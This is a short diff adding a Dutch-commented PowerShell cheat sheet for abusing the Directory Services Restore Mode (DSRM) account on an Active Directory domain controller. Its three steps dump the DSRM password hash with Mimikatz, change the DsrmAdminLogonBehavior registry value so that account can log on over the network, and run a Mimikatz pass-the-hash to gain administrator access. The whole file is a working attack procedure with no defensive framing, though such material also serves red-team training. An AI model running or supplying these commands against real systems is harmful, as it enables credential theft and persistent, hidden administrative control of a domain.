@@ -1,0 +1,8 @@
+# DSRM abuse - Local admin hash van DC hergebruiken
+# Stap 1: DSRM wachtwoord hash dumpen (DA nodig)
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dc01
+# Stap 2: Logon behavior aanpassen op DC
+Enter-PSSession -ComputerName dc01
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+# Stap 3: Pass the hash met DSRM admin
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:DSRM_NTLM_HASH /run:powershell.exe"'
